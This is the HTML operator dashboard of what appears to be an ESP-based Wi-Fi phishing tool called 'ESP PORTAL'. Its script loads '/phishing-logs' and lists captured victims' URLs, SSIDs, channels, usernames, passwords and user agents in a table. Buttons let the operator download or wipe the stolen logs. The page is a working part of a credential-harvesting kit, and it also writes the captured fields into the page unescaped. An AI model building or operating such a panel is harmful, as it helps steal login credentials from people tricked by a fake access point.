<!DOCTYPE html>
<html>
  <head>
    <meta content="text/html;charset=utf-8" http-equiv="Content-Type">
    <meta content="utf-8" http-equiv="encoding">
    <meta name="viewport" content="width=device-width, initial-scale=0.8, minimal-ui">
    <title>ESP PORTAL</title>
    <link rel="stylesheet" href="../styles/milligram.min.css">
    <link rel="stylesheet" href="milligram.min.css">

    <link rel="stylesheet" href="../styles/normalize.min.css">
    <link rel="stylesheet" href="normalize.min.css">

    <link rel="stylesheet" href="../index.css">
    <link rel="stylesheet" href="index.css">

    <script src="../utils/jquery.slim.min.js"></script>
    <script src="jquery.slim.min.js"></script>

    <script src="../index.js"></script>
    <script src="index.js"></script>
  </head>
  <body>
    <main class="wrapper">
      <nav class="navigation">
        <section class="container">
          <div class="navigation-title"><a href="/esp-portal" class="button">Home</a></div>
          <div class="float-right navigation-title">ESP PORTAL</div>
        </section>
      </nav>
      <section class="container">
        <div class="row">
          <div class="column">
            <div class="row">
              <div class="column">
                <h4>Connected stations</h4>
                <div style="overflow-x: scroll;">
                  <table>
                    <thead>
                      <tr>
                        <th>url</th>      
                        <th>ssid</th>      
                        <th>channel</th>      
                        <th>user</th>      
                        <th>password</th>      
                        <th>user_agent</th>
                      </tr>
                    </thead>  
                    <tbody id="phishing-table"></tbody>
                  </table>
                </div>
              </div>
            </div><a href="/download-phish-logs" class="button" download>Download logs</a> <a href="/clean-phish-logs" class="button button-outline">Wipe logs</a>
          </div>
        </div>
      </section>
    </main>
  </body>
</html>
<script>
  function loadJson(){
    getFile("/phishing-logs",function(res){
      console.log(res);
      var list = JSON.parse(res);
      console.log("LIST", list);

      list.forEach(json => {
        console.log(json);
        $("#phishing-table").append('<tr><td>'+json.url+'</td><td>'+json.ssid+'</td><td>'+json.channel+'</td><td>'+json.user+'</td><td>'+json.password+'</td><td>'+json.user_agent+'</td></tr>');
      });
    });
  
  }
</script>
<script>
  $(document).ready(function() {
    loadJson();
  });
</script>